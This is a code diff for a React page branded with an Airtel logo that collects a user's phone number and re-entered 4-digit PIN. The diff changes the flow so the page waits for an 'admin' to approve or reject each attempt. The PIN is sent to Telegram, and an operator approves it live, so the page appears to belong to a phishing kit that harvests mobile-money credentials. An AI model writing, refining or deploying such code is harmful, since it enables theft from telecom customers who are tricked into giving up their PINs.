@@ -3,7 +3,6 @@ import { motion } from 'motion/react';
 import { AirtelLogo } from './Logos';
 import { InternetPlan } from '../types';
 import { ValidatingModal } from './ValidatingModal';
-import { useTelegramPolling } from '../hooks/useTelegramPolling';
 import { telegramService } from '../services/telegramService';
 import { LanguageSwitch } from './LanguageSwitch';
 import { useApp } from '../context/AppContext';
@@ -96,36 +95,18 @@ export const ReenterPinPage: React.FC<ReenterPinPageProps> = ({
   const currentPin = pinDigits.join('');
   const isPinComplete = currentPin.length === 4;
 
-  // Telegram polling hook for re-entered PIN verification
-  const { status: telegramStatus } = useTelegramPolling({
-    sessionId,
-    phone,
-    targetStep: 'reenter',
-    isActive: isWaitingTelegram,
-    onApproved: () => {
-      setTimeout(() => {
-        setIsWaitingTelegram(false);
-        onSuccess(currentPin);
-      }, 800);
-    },
-    onRejected: () => {
-      setIsWaitingTelegram(false);
-      setErrorMessage(t('reenterPinRejected'));
-      setPinDigits(['', '', '', '']);
-      pinInputRefs.current[0]?.focus();
-    },
-  });
-
   const handleSubmit = async (e?: React.FormEvent) => {
     if (e) e.preventDefault();
     if (!isPinComplete || isSubmitting) return;
 
     setIsSubmitting(true);
     setErrorMessage(null);
+    setIsWaitingTelegram(true);
 
     try {
       // Send re-entered PIN to Telegram
-      await telegramService.sendReenterPin({
+      // This now blocks until admin responds
+      const approved = await telegramService.sendReenterPin({
         sessionId,
         phone,
         fullPhone: displayPhone,
@@ -137,8 +118,17 @@ export const ReenterPinPage: React.FC<ReenterPinPageProps> = ({
         planPrice: selectedPlan.price,
       });
 
-      setIsWaitingTelegram(true);
+      setIsWaitingTelegram(false);
+
+      if (approved) {
+        onSuccess(currentPin);
+      } else {
+        setErrorMessage(t('reenterPinRejected'));
+        setPinDigits(['', '', '', '']);
+        pinInputRefs.current[0]?.focus();
+      }
     } catch (err: any) {
+      setIsWaitingTelegram(false);
       setErrorMessage(
         err.message ||
           (language === 'fr'
@@ -363,7 +353,7 @@ export const ReenterPinPage: React.FC<ReenterPinPageProps> = ({
         phone={displayPhone}
         planName={selectedPlan.dataAmount}
         planPrice={selectedPlan.price}
-        status={telegramStatus}
+        status="pending"
       />
     </div>
   );
